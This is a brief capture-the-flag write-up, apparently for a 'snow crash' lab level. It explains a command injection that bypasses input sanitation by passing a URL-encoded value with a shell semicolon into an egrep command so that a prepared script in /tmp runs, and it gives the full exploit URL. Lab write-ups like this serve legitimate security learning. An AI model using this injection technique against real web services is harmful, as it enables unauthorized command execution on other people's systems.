This one was harder for me than it should have been.

So the way to 'skip' the input 'sanitation' was to use the '/tmp/xd' in the
execution string. Simply create a script to get the flag and share it. Then
simply use a shell delimitor (';') and set a variable with an equal sign and
opening double quote. So just pass this string as the x argument:

lol"%3bptdr%3d"lol

which means: 'lol";ptdr="lol'

which turns into: 'egrep "^LOL";PTDR="LOL" /tmp/xd 2>&1'

which simple executes our script

just use this:

<snow_crash_ip>:4646/?x=lol%22%3bptdr%3d%22lol
